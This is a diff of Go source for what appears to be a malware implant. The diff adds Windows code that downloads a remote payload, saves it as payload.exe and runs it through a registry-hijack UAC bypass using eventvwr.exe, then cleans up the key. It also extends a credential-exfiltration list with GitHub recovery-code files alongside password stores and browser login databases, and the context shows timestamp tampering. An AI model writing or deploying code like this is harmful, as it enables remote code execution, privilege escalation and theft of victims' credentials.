@@ -412,78 +412,160 @@ func downloadAndExecute(ctx context.Context, fileURL string, lazyconf LazyDataTy
 	go func() {
 		defer globalRecover()
 
+		var filePath string
+
 		if runtime.GOOS == "windows" {
-			if lazyconf.DebugImplant == "True" {
-				fmt.Println("[WARNING] Downloading and executing to /dev/shm is not applicable on Windows.")
+			// Directorio temporal en Windows
+			tmpPath := os.Getenv("APPDATA") + "\\"
+			filePath = tmpPath + "payload.exe"
+
+			// Descarga el archivo
+			client := http.Client{Timeout: 30 * time.Second}
+			req, err := http.NewRequestWithContext(ctx, "GET", fileURL, nil)
+			if err != nil {
+				if lazyconf.DebugImplant == "True" {
+					fmt.Printf("[ERROR] Error creating download request for %s: %v\n", fileURL, err)
+				}
+				return
 			}
-			return
-		}
 
-		tmpDir := "/dev/shm"
-		fileName := filepath.Base(fileURL)
-		filePath := filepath.Join(tmpDir, fileName)
-
-		client := http.Client{
-			Timeout: 30 * time.Second,
-		}
-
-		req, err := http.NewRequestWithContext(ctx, "GET", fileURL, nil)
-		if err != nil {
-			if lazyconf.DebugImplant == "True" {
-				fmt.Printf("[ERROR] Error creating download request for %s: %v\n", fileURL, err)
+			resp, err := client.Do(req)
+			if err != nil {
+				if lazyconf.DebugImplant == "True" {
+					fmt.Printf("[ERROR] Error downloading file from %s: %v\n", fileURL, err)
+				}
+				return
 			}
-			return
-		}
+			defer resp.Body.Close()
 
-		resp, err := client.Do(req)
-		if err != nil {
-			if lazyconf.DebugImplant == "True" {
-				fmt.Printf("[ERROR] Error downloading file from %s: %v\n", fileURL, err)
+			if resp.StatusCode != http.StatusOK {
+				if lazyconf.DebugImplant == "True" {
+					fmt.Printf("[ERROR] Failed to download file from %s, status code: %d\n", fileURL, resp.StatusCode)
+				}
+				return
 			}
-			return
-		}
-		defer resp.Body.Close()
 
-		if resp.StatusCode != http.StatusOK {
-			if lazyconf.DebugImplant == "True" {
-				fmt.Printf("[ERROR] Failed to download file from %s, status code: %d\n", fileURL, resp.StatusCode)
+			file, err := os.Create(filePath)
+			if err != nil {
+				if lazyconf.DebugImplant == "True" {
+					fmt.Printf("[ERROR] Error creating file %s: %v\n", filePath, err)
+				}
+				return
 			}
-			return
-		}
+			defer file.Close()
 
-		file, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0755)
-		if err != nil {
-			if lazyconf.DebugImplant == "True" {
-				fmt.Printf("[ERROR] Error opening file %s: %v\n", filePath, err)
+			_, err = io.Copy(file, resp.Body)
+			if err != nil {
+				if lazyconf.DebugImplant == "True" {
+					fmt.Printf("[ERROR] Error saving file to %s: %v\n", filePath, err)
+				}
+				return
 			}
-			return
-		}
-		defer file.Close()
 
-		_, err = io.Copy(file, resp.Body)
-		if err != nil {
-			if lazyconf.DebugImplant == "True" {
-				fmt.Printf("[ERROR] Error saving file to %s: %v\n", filePath, err)
+			// Ejecutar UAC bypass en Windows
+			err = executeUACBypass(filePath, lazyconf)
+			if err != nil {
+				if lazyconf.DebugImplant == "True" {
+					fmt.Printf("[ERROR] Error executing UAC bypass: %v\n", err)
+				}
+				return
 			}
-			return
-		}
 
-		cmd := exec.Command(filePath)
-
-		
-		
-
-		if err := cmd.Start(); err != nil {
 			if lazyconf.DebugImplant == "True" {
-				fmt.Printf("[ERROR] Error starting executable %s: %v\n", filePath, err)
+				fmt.Printf("[INFO] Payload executed via UAC bypass: %s\n", filePath)
 			}
-			return
-		}
+		} else {
+			// Lógica para Linux
+			tmpDir := "/dev/shm"
+			fileName := filepath.Base(fileURL)
+			filePath = filepath.Join(tmpDir, fileName)
 
-		if lazyconf.DebugImplant == "True" {
-			fmt.Printf("[INFO] Background process started: %s\n", filePath)
+			client := http.Client{Timeout: 30 * time.Second}
+			req, err := http.NewRequestWithContext(ctx, "GET", fileURL, nil)
+			if err != nil {
+				if lazyconf.DebugImplant == "True" {
+					fmt.Printf("[ERROR] Error creating download request for %s: %v\n", fileURL, err)
+				}
+				return
+			}
+
+			resp, err := client.Do(req)
+			if err != nil {
+				if lazyconf.DebugImplant == "True" {
+					fmt.Printf("[ERROR] Error downloading file from %s: %v\n", fileURL, err)
+				}
+				return
+			}
+			defer resp.Body.Close()
+
+			if resp.StatusCode != http.StatusOK {
+				if lazyconf.DebugImplant == "True" {
+					fmt.Printf("[ERROR] Failed to download file from %s, status code: %d\n", fileURL, resp.StatusCode)
+				}
+				return
+			}
+
+			file, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0755)
+			if err != nil {
+				if lazyconf.DebugImplant == "True" {
+					fmt.Printf("[ERROR] Error opening file %s: %v\n", filePath, err)
+				}
+				return
+			}
+			defer file.Close()
+
+			_, err = io.Copy(file, resp.Body)
+			if err != nil {
+				if lazyconf.DebugImplant == "True" {
+					fmt.Printf("[ERROR] Error saving file to %s: %v\n", filePath, err)
+				}
+				return
+			}
+
+			cmd := exec.Command(filePath)
+			if err := cmd.Start(); err != nil {
+				if lazyconf.DebugImplant == "True" {
+					fmt.Printf("[ERROR] Error starting executable %s: %v\n", filePath, err)
+				}
+				return
+			}
+
+			if lazyconf.DebugImplant == "True" {
+				fmt.Printf("[INFO] Background process started: %s\n", filePath)
+			}
 		}
 	}()
+}
+
+func executeUACBypass(filePath string, lazyconf LazyDataType) error {
+	if runtime.GOOS != "windows" {
+		if lazyconf.DebugImplant == "True" {
+			fmt.Println("[WARNING] UAC bypass is not applicable on non-Windows platforms")
+		}
+		return fmt.Errorf("UAC bypass not supported on this platform")
+	}
+
+	// Añadir clave al registro
+	cmd := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/d", filePath)
+	_, err := cmd.Output()
+	if err != nil {
+		return fmt.Errorf("error setting registry key: %v", err)
+	}
+
+	// Ejecutar eventvwr.exe
+	c := exec.Command("cmd", "/C", "eventvwr.exe")
+	if err := c.Run(); err != nil {
+		return fmt.Errorf("error running eventvwr.exe: %v", err)
+	}
+
+	// Limpiar el registro
+	cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", "HKCU\\Software\\Classes\\mscfile", "/f")
+	_, err = cmd.Output()
+	if err != nil {
+		return fmt.Errorf("error deleting registry key: %v", err)
+	}
+
+	return nil
 }
 func obfuscateFileTimestamps(lazyconf LazyDataType, filePath string) error {
     oldTime := time.Now().AddDate(-1, 0, 0)
@@ -528,6 +610,8 @@ func handleExfiltrate(ctx context.Context, command string, lazyconf LazyDataType
         filepath.Join(homeDir, ".password-store", "*"),
         filepath.Join(homeDir, ".keepassxc", "*.kdbx"),
         filepath.Join(homeDir, "Documents", "*.kdbx"),        
+        filepath.Join(homeDir, "Downloads", "github-recovery-codes.txt"),  
+        filepath.Join(homeDir, "Descargas", "github-recovery-codes.txt"),  
         filepath.Join(homeDir, ".config", "google-chrome", "Default", "Login Data"),
         filepath.Join(homeDir, ".mozilla", "firefox", "*", "key4.db"),
         filepath.Join(homeDir, ".mozilla", "firefox", "*", "logins.json"),
